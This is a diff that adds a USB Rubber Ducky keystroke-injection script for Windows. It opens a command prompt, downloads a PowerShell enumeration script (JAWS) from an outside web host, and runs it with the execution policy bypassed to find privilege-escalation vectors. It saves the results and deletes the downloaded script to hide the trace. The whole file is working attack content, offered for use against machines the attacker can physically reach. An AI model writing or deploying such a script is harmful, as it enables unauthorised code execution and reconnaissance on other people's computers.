@@ -1,0 +1,17 @@
+REM JAWS ducky script to quickly identify potential priv esc vectors on Windows
+DELAY 3000
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+ENTER
+DELAY 1000
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://www.ihack.eu/files/JAWS.ps1','%TEMP%\JAWS.ps1')
+DELAY 1000
+ENTER
+DELAY 600
+STRING powershell -ep bypass -File %TEMP%\JAWS.ps1 -OuputFilename %TEMP%\JAWS.txt
+DELAY 5000
+STRING del %TEMP%\JAWS.ps1
+DELAY 300
+ENTER
